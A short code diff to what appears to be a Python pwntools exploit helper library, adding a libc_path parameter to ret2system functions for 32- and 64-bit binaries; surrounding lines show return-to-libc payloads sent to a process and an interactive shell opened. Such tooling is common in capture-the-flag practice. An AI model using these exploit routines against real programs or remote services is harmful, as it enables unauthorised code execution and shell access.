@@ -548,7 +548,7 @@ def ret2libc_write_x32_remote(program,libc,padding,url,port):
 	io.sendline(payload2)
 	io.interactive()
 
-def ret2_system_x32(program,libc,padding):
+def ret2_system_x32(program,libc,padding,libc_path):
 	io = process(program)
 	e = ELF(program)
 	system_addr = e.symbols['system']
@@ -562,7 +562,7 @@ def ret2_system_x32(program,libc,padding):
 	io.sendline(payload)
 	io.interactive()
 
-def ret2_system_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr):
+def ret2_system_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,libc_path):
 	if pop_rdi_addr == None:
 		print("pop rdi指令不存在，无法利用")
 		sys.exit(0)
